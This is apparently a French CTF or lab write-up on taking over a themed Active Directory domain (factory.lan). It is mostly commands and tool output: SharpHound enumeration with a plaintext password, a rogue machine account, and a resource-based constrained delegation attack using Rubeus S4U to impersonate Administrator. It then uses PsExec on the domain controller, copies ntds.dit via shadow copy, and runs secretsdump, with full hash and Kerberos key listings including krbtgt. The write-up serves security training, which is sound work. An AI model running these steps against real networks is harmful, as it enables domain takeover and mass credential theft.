# Step 8

## bloodhound the domain from tomcat machine

```bash
SharpHound.exe --ZipFileName .\output.zip --JsonFolder . --CollectionMethod All,GPOLocalGroup,LoggedOn --Domain factory.lan --LdapUser adminServer --LdapPass QueStC3qU!esTpetItEtMarr0N?
```

connecter la commando au domaine
faire un bloodhound
passer le svcjoincomputertodom en admin local
New-MachineAccount -MachineAccount commanda -Password $(ConvertTo-SecureString 'Coucou12!' -AsPlainText -Force)

---

## TL;DR

Sachant qu'on a :

- un compte ad (adminServer)
- un compte de service (SvcJoinComputerToDom)
- notre machine windows

On fait du bloudhound, on va le genericall du groupe enterprise admin, dont administrator fait parti

=> on peut faire du resources based delegation

https://beta.hackndo.com/resource-based-constrained-delegation-attack/

faut juste tweaker un peu par rapport à ce que pixis dit, car on a pas besoin de faire de man in the middle ipv6, vu qu'on a déjà le compte SvcJoinComputerToDom qui a les droits nécessaires pour ajouter une machine, un SPN à la machine et modifier les droits de msDS-AllowedToActOnBehalfOfOtherIdentity.

Après on tombe sur le blog de harmj0y qui propose la même chose que pixis mais avec les commandes en utilisant rubeus pour le s4u : https://www.harmj0y.net/blog/activedirectory/a-case-study-in-wagging-the-dog-computer-takeover/

https://gist.github.com/HarmJ0y/224dbfef83febdaf885a8451e40d52ff#file-rbcd_demo-ps1-L22-L33

Ce blog parle de la meme attaque mais en très détaillé avec beaucoup de cas d'usage : https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html

Dans la section "Empowering Active Directory Objects and Reflective Resource-Based Constrained Delegation", il ajoute directmenet la machine, donc on peut commencer comme ça et continuer avec la cheatsheet de harmj0y.

## Ajouter la machine au domaine

Mettre le vpn sur l'hote, la VM en nat
setup les DNS:

```
Principal : 172.16.42.5
Secondaire : 192.168.140.1 (l'hote)
```

Dans windows, rejoindre un domaine:

```
factory.lan > avec le compte SvcJoinComputerToDom > le passer admin local
```

Un petit reboot et on est bon, pour tester si on est bien connecté au domaine :

```powershell
net user /dom

La demande sera traitée sur contrôleur de domaine du domaine factory.lan.


comptes d’utilisateurs de \\DC01-WW2.factory.lan

-------------------------------------------------------------------------------
aas                      Administrator            adminServer
adminWorkstation         augustus                 grandma.josephine
grandpa.george           grandpa.joe              Guest
krbtgt                   luminous.lolly           lyderic.lefebvre
mike.teavee              mrs.gloop                mrs.salt
oompaLoompa              pedro.lalicorne          pedro.lecochon
prince.pondicherry       slugworth                SvcJoinComputerToDom
wilbur.wonka             zajtdif
La commande s’est terminée correctement.
```

## Bloodhound

```powershell
.\SharpHound.exe -c all
```

[Bloodhound](img/bloodhound.PNG)

## Les bonne lib

Powerview a plusieurs version et faut prendre celle de dev sinon le Get-ADComputer existe pas (c'est chiant):

> https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1

> https://raw.githubusercontent.com/Kevin-Robertson/Powermad/master/Powermad.ps1

## Vérification des droits

On vérifie qu'on a bien les droits de "GenericWrite" sur la cible (le DC donc) :

```powershell
Import-Module .\powermad.ps1

Import-Module .\powerview.ps1

$AttackerSID = Get-DomainUser SvcJoinComputerToDom -Properties objectsid | Select -Expand objectsid

$ACE = Get-DomainObjectACL dc01-ww2.factory.lan | ?{$_.SecurityIdentifier -match $AttackerSID}

$ACE
```

Output :

```
ObjectDN               : CN=DC01-WW2,OU=Domain Controllers,DC=factory,DC=lan
ObjectSID              : S-1-5-21-973561226-3767909689-3041734699-1000
ActiveDirectoryRights  : WriteProperty
ObjectAceFlags         : ObjectAceTypePresent
ObjectAceType          : 3f78c3e5-f79a-46bd-a0b8-9d18116ddc79
InheritedObjectAceType : 00000000-0000-0000-0000-000000000000
BinaryLength           : 56
AceQualifier           : AccessAllowed
IsCallback             : False
OpaqueLength           : 0
AccessMask             : 32
SecurityIdentifier     : S-1-5-21-973561226-3767909689-3041734699-1106
AceType                : AccessAllowedObject
AceFlags               : ContainerInherit
IsInherited            : False
InheritanceFlags       : ContainerInherit
PropagationFlags       : None
AuditFlags             : None

ObjectDN              : CN=DC01-WW2,OU=Domain Controllers,DC=factory,DC=lan
ObjectSID             : S-1-5-21-973561226-3767909689-3041734699-1000
ActiveDirectoryRights : ReadProperty, ReadControl
BinaryLength          : 36
AceQualifier          : AccessAllowed
IsCallback            : False
OpaqueLength          : 0
AccessMask            : 131088
SecurityIdentifier    : S-1-5-21-973561226-3767909689-3041734699-1106
AceType               : AccessAllowed
AceFlags              : ContainerInherit
IsInherited           : False
InheritanceFlags      : ContainerInherit
PropagationFlags      : None
AuditFlags            : None
```

Ici on a PropertyWrite, visiblement c'est pareil
Puis on converti le SID parce que je sais pas :

```powershell
ConvertFrom-SID $ACE.SecurityIdentifier

FACTORY\SvcJoinComputerToDom
FACTORY\SvcJoinComputerToDom
```

## Ajout d'une machine controlée dans le domaine

Pour que l'attaque fonctionne il faut un compte avec un SPN, si on en a pas on peut en ajouter un grâce au MachineAccountQuota (par défaut tu peux ajouter 10 machines dans le domaine).

Il existe New-MachineAccount dans powermad :

```powershell
New-MachineAccount -MachineAccount bitedepoulet -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)

[+] Machine account bitedepoulet added
```

## Set du msDS-AllowedToActOnBehalfOfOtherIdentity

On va juste set le tableau pour un compte et changer le sid avec notre machine qui contient un SPN :

```powershell
$ComputerSid = Get-DomainComputer bitedepoulet -Properties objectsid | Select -Expand objectsid

$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"

$SDBytes = New-Object byte[] ($SD.BinaryLength)

$SD.GetBinaryForm($SDBytes, 0)

Get-DomainComputer dc01-ww2.factory.lan | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

$RawBytes = Get-DomainComputer dc01-ww2.factory.lan -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity

$Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0

$Descriptor.DiscretionaryAcl
```

Output:

```
BinaryLength       : 36
AceQualifier       : AccessAllowed
IsCallback         : False
OpaqueLength       : 0
AccessMask         : 983551
SecurityIdentifier : S-1-5-21-973561226-3767909689-3041734699-6602
AceType            : AccessAllowed
AceFlags           : None
IsInherited        : False
InheritanceFlags   : None
PropagationFlags   : None
AuditFlags         : None
```

On le voit bien en `AccessAllowed`

Et on a bien pas les droits :

```powershell
dir \\dc01-ww2.factory.lan\C$

dir : Accès refusé
Au caractère Ligne:1 : 1
+ dir \\dc01-ww2.factory.lan\C$
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (\\dc01-ww2.factory.lan\C$:String) [Get-ChildItem], UnauthorizedAccess
   Exception
    + FullyQualifiedErrorId : ItemExistsUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand

dir : Impossible de trouver le chemin d'accès « \\dc01-ww2.factory.lan\C$ », car il n'existe pas.
Au caractère Ligne:1 : 1
+ dir \\dc01-ww2.factory.lan\C$
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (\\dc01-ww2.factory.lan\C$:String) [Get-ChildItem], ItemNotFoundExceptio
   n
    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.GetChildItemCommand
```

## S4U2User / S4U2Proxy

On va utiliser rubeus pour faire ça, mais avant il faut récupérer le mot de passe du compte `bitedepoulet$` en rc4 ou aes256 :

```powershell

```

Lorsque c'est fait, il faut passer à l'exploitation, on encore utiliser Rubeus pour qu'il fasse la tambouille avec s4u et générer un ticket avec les droits Administrator sur le DC:

```
C:\Tools\Rubeus-master\Rubeus\bin\Debug\Rubeus.exe s4u /user:bitedepoulet$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:cifs/dc01-ww2.factory.lan /ptt
```

Output :

```
   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.4.2

[*] Action: Ask TGT

[*] Using rc4_hmac hash: EF266C6B963C0BB683941032008AD47F
[*] Using domain controller: DC01-WW2.factory.lan (172.16.42.5)
[*] Building AS-REQ (w/ preauth) for: 'factory.lan\bitedepoulet$'
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIFFjCCBRKgAwIBBaEDAgEWooIEKTCCBCVhggQhMIIEHaADAgEFoQ0bC0ZBQ1RPUlkuTEFOoiAwHqAD
      AgECoRcwFRsGa3JidGd0GwtmYWN0b3J5LmxhbqOCA+MwggPfoAMCARKhAwIBAqKCA9EEggPN8p3q8BvM
      4XQL+tX5JK0m8CCM2OKuVLjLLHlPiNiZP4ZBxtaOBtPAM6UccyL7XlrrsXo4AN+Y+maPUFb21j6az7uR
      4Nz4wwdoxYChHIyzLN5wTtAEny8jJuRaU8va3CVr4nWT95r7ZVuvkoaompAOHrNNG+1KRspZVEJY0aKh
      wYn9Vd66SExdX4xR+NuUpJpMiTt5/uTvdsxyb/aU0NvtFj78UbreUF+HEIm7wrVFKX9OBApPLlgbqNvQ
      9leIpjVU6AtyKxEsJatc4TTBVy8XUjqEUgHlZRekfkalUSwg4+q/9MT6k7H9b0TSp8eXGwHQy1E7f6f3
      1+eR7Jxj3HyjMcg5sLBHOcRB4/wHEJtIKwn//Jfwns8uayVSY7C5YbStpPMz1AP0KDC8+EPL1AfTjQ5h
      /u4Oel799J5zVb4CTcMC7Ltlwkz7vnFUXH/Zdx+eWHP9qFG2aLpLT8RL5hffc44YQq1xRZMTvq6f2Ps0
      RiV3DyGCUi+WIb1TtpPPrvToKT0Z0V+mXo+FoQ6/JXznw6Tg8ZmH8gQ8KFkTHZXky3IS03PgiwJsp/Jf
      sh+79ZdIz4x9PBZ2hiS3X5fHVEpD+bdEbMAJfC9X40W/2AXRD34hvMBPIar1PSQRvCJvQrFupng8onkc
      Z3BEAtn8iVC25KYoAs0e7xaJSjODwpA9HkcohBUrwRjP9QgaifBbUHVIJKtvVEf5r8I14UvSP+k2J79e
      1DPcY0j4S+FIosiotN+TiX8+uiAJmRVokFnAt9E9SWvu2tWJQC8Z9FH6St9lN5B2P5g/naa/qCxenynP
      Vlgqm+UM17QOCxPXkP5OiFdeUGyQaAo+DTx6ExFzif87/VZOqMlm5rntLFWwZow9gHgKZJKEBkLE94Iz
      ayqx9ZJzH9f97eOI1c/s0naqIAKVuo5uRKajFTKzxPNjCpYVE0YoOnAwvagkfdV3ZQ9sHOVu4oUgLod1
      nKV+Ts8SczK3daWkM9hHnKeYcdOs6RIUn13TiV+W+c/dS9dkXe9s1veLfR1zbmVnMEDIVerD/IOZh18e
      HY4y0pQfTQHEIaqFXCAT9IMrtZ/Qll2i5SHzxbzGEA7TAkYC9mo9mpdloM0jXcxoUbxZQS4hW8ru1jKj
      R7NAWvWt0r3Ic5jOiYDHVUMflc9+cxi/+TQxZxrpdEhqXDte7cm+P3kHfnk0M/kRTLqRP6cjIifhjJea
      sRyAmlN6APA0HEzEIe89bPvor0nuiQ/3b0c6rrqMIHb4H0zqZREn6XfTDMaNWScys8XroXIQuiKLz8xn
      M3z/P2jj0aOB2DCB1aADAgEAooHNBIHKfYHHMIHEoIHBMIG+MIG7oBswGaADAgEXoRIEEPGHsk5n//+Z
      iiTWmCPYKeehDRsLRkFDVE9SWS5MQU6iGjAYoAMCAQGhETAPGw1iaXRlZGVwb3VsZXQkowcDBQBA4QAA
      pREYDzIwMTkwNzE3MDk0MjIwWqYRGA8yMDE5MDcxNzE5NDIyMFqnERgPMjAxOTA3MjQwOTQyMjBaqA0b
      C0ZBQ1RPUlkuTEFOqSAwHqADAgECoRcwFRsGa3JidGd0GwtmYWN0b3J5Lmxhbg==


[*] Action: S4U

[*] Using domain controller: DC01-WW2.factory.lan (172.16.42.5)
[*] Building S4U2self request for: 'bitedepoulet$@FACTORY.LAN'
[*] Sending S4U2self request
[+] S4U2self success!
[*] Got a TGS for 'Administrator@FACTORY.LAN' to 'bitedepoulet$@FACTORY.LAN'
[*] base64(ticket.kirbi):

      doIFjjCCBYqgAwIBBaEDAgEWooIEmzCCBJdhggSTMIIEj6ADAgEFoQ0bC0ZBQ1RPUlkuTEFOohowGKAD
      AgEBoREwDxsNYml0ZWRlcG91bGV0JKOCBFswggRXoAMCARehAwIBAaKCBEkEggRFqnXcf3kqNCPNrvaY
      EG+KCr8wkMIgqk1uzo5ZZetc9brbR1LwFHEaKKvafJJYA6h9zN4fdSK/zrCLYiV/gMZaPa02WUmmKazi
      mRPsWZJ5JWLW7KVKmMV3YHJi3q/Q+75qkuZBwlv1sWLtGifOFQZrmsQDF8piMCula4SxLePqgNea48uz
      9Vkm+qDFtD52Ay47lDofYLpamIwthykIbSMJX9GFILRHrgi1adWtQg/49/gbG5Sv20zVm4uqt/o4rhuk
      bU8Nu/QcAS6WZDgRR1WcyeM3Kw6h1aQJlir+nf3O3cojO0gjR9RadicIE7cW205wDcHs1sM+v/ffE3Ln
      j9IjVYyYjnwVXWaia2Uf7DxSBfXP7Jsh3sZ0djXnXx1AsEOfxNAdjzWGo/5Kur2DwuGHpchCZA6fh08T
      YHI4wBruyzHunVquiaY9Mq20CLbQUYHcAw83LPb3QpOdzn5eesZ8JaV0r5u30yKX81l5X1NKsQSExnjY
      WVG6sLqz87gHhN7+QpSqMiS4JkePFK747ypiKic9cncehStLqf0vKiyrjAepSD02w1a+Befk6zx7rygX
      clr5L2dZtdPtZCTCU5AAsaS60+vXtD5kPZlTDa8rV6hVRdGntFedbsYkIP6aidN5oI6FXiitB9+f50Qx
      OFZdp+8ItWEBdiGwhlxemj0SlZKbgMn1ijGkIddebQ9jKU5/BgTIDBX35j5bKL8hLyHbjPDVX3mZjX45
      /F5EN1xurZ0UGy9MzTqXXNJto5e+mQsRjaYFBNgYa/4YcH420biZZce1YGg1Y5mVRzIMAS+EStyvnseR
      PAvtBDTmgDino9K0oB9AWKN5e1LW0EKxX39Tz+sz1zhQlLo/zLXKKYPyN68Cndq2pOsR3b30FZ0cEbRu
      D95Gcxrlm3MNH+nR0sla+uJAnRE1NvTqdPehvqDWYRyiLf/3gs6DPRPUJ031tCqQ7vZPmJ7o8k8+r08d
      /pin/fBNO8KF4UtNQpz+fY2Uot11VgtMd5VBq41/ixaQffoXC+9/GMhVQyiZLnm3LqFn+r8sCvpCPCfl
      FBSpS7dP7MgNcgvMnNyRL+vSECa3hdLXJq3sAFmgYmK31GIuhtDkJeGiCM8MGZSgvygctVng/QDWymvQ
      ZVMmrgWhzZ8buxwC3ZQSqef4I9jr590YX53MVp6A4p3N9i1Kq7u0OymBdjfD/X/JY15U5VTstmHSxJ41
      xpQoRNNnoOO+aqXfWMW32W8P2TbeFw9HoOomeT081oXtE1X+S8t1jApPGlxX9APdET2oPkkPaR3WoZOs
      8uCMbvNfT3oFxYDw6PuOwLxSbhI8LQmXNIoP1abivIfvRG8DqlJwknaHx0b8WJVegTA0wT4Lo6nnA5uI
      Y5gBtNE4GSe+2eVwkIZiGVSGKUcsH+6JxVfjqu32b+8QvyCOl4AK4XJPDpz/mBLMMK9yY3P1UWBnSO03
      aaOB3jCB26ADAgEAooHTBIHQfYHNMIHKoIHHMIHEMIHBoBswGaADAgEXoRIEEAItGEY0qgOQoHAIM8nz
      NcOhDRsLRkFDVE9SWS5MQU6iJjAkoAMCAQqhHTAbGxlBZG1pbmlzdHJhdG9yQEZBQ1RPUlkuTEFOowcD
      BQAAoQAApREYDzIwMTkwNzE3MDk0MjIxWqYRGA8yMDE5MDcxNzE5NDIyMFqnERgPMjAxOTA3MjQwOTQy
      MjBaqA0bC0ZBQ1RPUlkuTEFOqRowGKADAgEBoREwDxsNYml0ZWRlcG91bGV0JA==

[*] Impersonating user 'Administrator' to target SPN 'cifs/dc01-ww2.factory.lan'
[*] Using domain controller: DC01-WW2.factory.lan (172.16.42.5)
[*] Building S4U2proxy request for service: 'cifs/dc01-ww2.factory.lan'
[*] Sending S4U2proxy request
[+] S4U2proxy success!
[*] base64(ticket.kirbi) for SPN 'cifs/dc01-ww2.factory.lan':

      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
      ZGMwMS13dzIuZmFjdG9yeS5sYW4=

[*] Action: Import Ticket
[+] Ticket successfully imported!
```

On vérifie qu'on a bien le ticket chargé en mémoire :

```powershell
 C:\Tools\Rubeus-master\Rubeus\bin\Debug\Rubeus.exe klist

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.4.2



[*] Action: List Kerberos Tickets (All Users)


  UserName                 : SvcJoinComputerToDom
  Domain                   : FACTORY
  LogonId                  : 0x214216
  UserSID                  : S-1-5-21-973561226-3767909689-3041734699-1106
  AuthenticationPackage    : Kerberos
  LogonType                : Interactive
  LogonTime                : 16/07/2019 16:15:39
  LogonServer              : DC01-WW2
  LogonServerDNSDomain     : FACTORY.LAN
  UserPrincipalName        : SvcJoinComputerToDom@factory.lan

    [0] - 0x12 - aes256_cts_hmac_sha1
      Start/End/MaxRenew: 17/07/2019 11:42:21 ; 17/07/2019 21:42:20 ; 24/07/2019 11:42:20
      Server Name       : cifs/dc01-ww2.factory.lan @ FACTORY.LAN
      Client Name       : Administrator @ FACTORY.LAN
      Flags             : name_canonicalize, ok_as_delegate, pre_authent, renewable, forwardable (40a50000)
```

On retest le dir sur le dc :

```powershell
dir \\dc01-ww2.factory.lan\C$


    Répertoire : \\dc01-ww2.factory.lan\C$


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       15/09/2018     09:19                PerfLogs
d-r---       19/06/2019     22:56                Program Files
d-----       20/06/2019     11:15                Program Files (x86)
d-r---       19/06/2019     23:00                Users
d-----       17/07/2019     11:43                Windows
```

On a bien impersonate administrator

## récupérer le ntds.dit

on utilise psexec pour se connecter avec les doits administrator au dc :

```powershell
PsExec.exe \\dc01-ww2.factory.lan cmd.exe

PsExec v2.2 - Execute processes remotely
Copyright (C) 2001-2016 Mark Russinovich
Sysinternals - www.sysinternals.com


Microsoft Windows [Version 10.0.17763.592]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
factory\administrator
```

On récupère le ntds.dit :

```powershell
C:\Windows\system32>vssadmin create shadow /for=C:
vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
(C) Copyright 2001-2013 Microsoft Corp.

Successfully created shadow copy for 'C:\'
    Shadow Copy ID: {8ab4f8ea-7cc5-4172-9632-637ce214546b}
    Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2

C:\Windows\system32> copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\ntds.dit C:\Windows\Temp\
        1 file(s) copied.
```

coté hote, suffit de le récupérer :

```powershell
copy \\dc01-ww2.factory.lan\C$\Windows\Temp\ntds.dit .
```

et de dump les hash :

```powershell
secretsdump.py -system .\system.save -ntds .\ntds.dit LOCAL


Impacket v0.9.20-dev - Copyright 2019 SecureAuth Corporation

[*] Target system bootKey: 0xb9982fe61843a484a5dfb37d4052ca3e
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: ab8548f1c5239f178df291bfeb561b93
[*] Reading and decrypting hashes from .\ntds.dit
Administrator:500:aad3b435b51404eeaad3b435b51404ee:7fc0c9c128598429119dbc01f450a603:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC01-WW2$:1000:aad3b435b51404eeaad3b435b51404ee:b1b723562e2d338f5c4ae58d317af937:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:3c68c509b487662c87ced8ebcda6e69b:::
adminWorkstation:1103:aad3b435b51404eeaad3b435b51404ee:8392dd649c5c285244fddd49695d188d:::
adminServer:1104:aad3b435b51404eeaad3b435b51404ee:e0ae639c0ee92b2118a1081376c940a0:::
augustus:1105:aad3b435b51404eeaad3b435b51404ee:c935c8f3ad074ca4e3eb329e53eee81c:::
SvcJoinComputerToDom:1106:aad3b435b51404eeaad3b435b51404ee:1a60f0036c1bfe4a8b42fe8d65d8437f:::
oompaLoompa:1107:aad3b435b51404eeaad3b435b51404ee:9f3392e8ca05b8725ffbc85051f6dd07:::
PC01-DEV$:1108:aad3b435b51404eeaad3b435b51404ee:31ed01b678009793aee136389c48caaa:::
SRV01-INTRANET$:1109:aad3b435b51404eeaad3b435b51404ee:b85880afbd4002b8885c7f7c7dc1e47e:::
mike.teavee:4101:aad3b435b51404eeaad3b435b51404ee:246a8f56c75852167bdc4aec0054e361:::
prince.pondicherry:4102:aad3b435b51404eeaad3b435b51404ee:d461239eb2659f5522aa7729bd64eb29:::
grandpa.joe:4103:aad3b435b51404eeaad3b435b51404ee:a40a07cf586c8343e152342a5d4baf96:::
grandma.josephine:4104:aad3b435b51404eeaad3b435b51404ee:9505067c09f32df2a67aafdfb739fcb9:::
mrs.salt:4105:aad3b435b51404eeaad3b435b51404ee:a1e286b3e52cfbb4b28673b18aa56b96:::
slugworth:4106:aad3b435b51404eeaad3b435b51404ee:43166900b473eb1ab174b4ae0bf2caee:::
mrs.gloop:4107:aad3b435b51404eeaad3b435b51404ee:82f0b8ad2c7641c97675a8ed6793b0a6:::
grandpa.george:4108:aad3b435b51404eeaad3b435b51404ee:3dd79eb66736034663970f877a73b0c9:::
luminous.lolly:4109:aad3b435b51404eeaad3b435b51404ee:f3a8b3d064204eeda981daf998700b9a:::
wilbur.wonka:4110:aad3b435b51404eeaad3b435b51404ee:f460a33f5240d31fdee24bcc3bee0858:::
pedro.lecochon:4111:aad3b435b51404eeaad3b435b51404ee:4803c267e1dfc9a2b155f47d59776caf:::
pedro.lalicorne:4112:aad3b435b51404eeaad3b435b51404ee:4803c267e1dfc9a2b155f47d59776caf:::
aas:4114:aad3b435b51404eeaad3b435b51404ee:b2f145def947f3387c84b287dc168300:::
lyderic.lefebvre:4115:aad3b435b51404eeaad3b435b51404ee:d3e06806eeae9fecd02c8613d74daa52:::
[*] Kerberos keys from .\ntds.dit
Administrator:aes256-cts-hmac-sha1-96:a4bf3bfc088551487aebf0186c2038263ace676b9727e4fef469921698b69cef
Administrator:aes128-cts-hmac-sha1-96:bb80409f548e045871a517ab1868d739
Administrator:des-cbc-md5:465e1f899704f4e3
DC01-WW2$:aes256-cts-hmac-sha1-96:5660bf57c64d22fe3c635528481e9f98cdb0254c48c28bf025c79eb39655571d
DC01-WW2$:aes128-cts-hmac-sha1-96:f24d3969e4fcbc36bed1668e6dda0c18
DC01-WW2$:des-cbc-md5:c4fd3e2016f270d3
krbtgt:aes256-cts-hmac-sha1-96:f7639c24f382ddba97cb092378d64f46b327cac201ae5b56ef8b66592ec81aaa
krbtgt:aes128-cts-hmac-sha1-96:48b2b750262384156671c84cabf117d0
krbtgt:des-cbc-md5:f7a279a7b0e6ad0e
adminWorkstation:aes256-cts-hmac-sha1-96:cd82315ea6244d5eedc1780a1791f3051f08af4c639c543e285813dd9661dd7e
adminWorkstation:aes128-cts-hmac-sha1-96:6dda65e2d0925b872c5c3eaa5a7a2766
adminWorkstation:des-cbc-md5:0e5dba2c0276e5e3
adminServer:aes256-cts-hmac-sha1-96:a7859e539e48057a19af7bb03c879dab71aafc5d0e0fcf373ab8c4e9a6258605
adminServer:aes128-cts-hmac-sha1-96:8d819ab4eaedfcf478c2e71eb9644f0d
adminServer:des-cbc-md5:b54938eccb758c73
augustus:aes256-cts-hmac-sha1-96:ff9442ea7eaf71a83931f41a38a9f1df90ea07e54dcade1b93da467ad02ce4d5
augustus:aes128-cts-hmac-sha1-96:42d2505e410c8ed0c0a1808932689bac
augustus:des-cbc-md5:fecd4acda7bc1657
SvcJoinComputerToDom:aes256-cts-hmac-sha1-96:d7c35a16938eed308d0020f564f9559d39a8349f3757b161314356d7fd3ea909
SvcJoinComputerToDom:aes128-cts-hmac-sha1-96:8185700ddaf0e4f9cd75900c65177e8c
SvcJoinComputerToDom:des-cbc-md5:676273ea01490420
oompaLoompa:aes256-cts-hmac-sha1-96:6a7b54e22d7cac47221309f6a4ef11ca0c72854aa976c13168cf840077033e78
oompaLoompa:aes128-cts-hmac-sha1-96:013bf15d61b2c22da453afa1f4b2b1aa
oompaLoompa:des-cbc-md5:45e0310ee934a704
PC01-DEV$:aes256-cts-hmac-sha1-96:a0061358876ff98e6c0d54c931486e848ec23b0c35b766918506cd024662e7e3
PC01-DEV$:aes128-cts-hmac-sha1-96:04e6f485fc766ece30a5009d650595e0
PC01-DEV$:des-cbc-md5:45df9e737604b9e9
SRV01-INTRANET$:aes256-cts-hmac-sha1-96:674fd164db83dab0b5574f500199ed4a31fe25dadbefbba4c5ab797f89ae78e5
SRV01-INTRANET$:aes128-cts-hmac-sha1-96:4449e44a56519e54cd5f6d560d52ca0a
SRV01-INTRANET$:des-cbc-md5:6d16400ed51652ae
mike.teavee:aes256-cts-hmac-sha1-96:0584b593973eaa3a15a8e0b0b8d0db00806961cf3bdde4590e1a3de8d7f3d0a2
mike.teavee:aes128-cts-hmac-sha1-96:d2e37214e7dbcdefea799018b6d67ff2
mike.teavee:des-cbc-md5:2a20c47c51a192b9
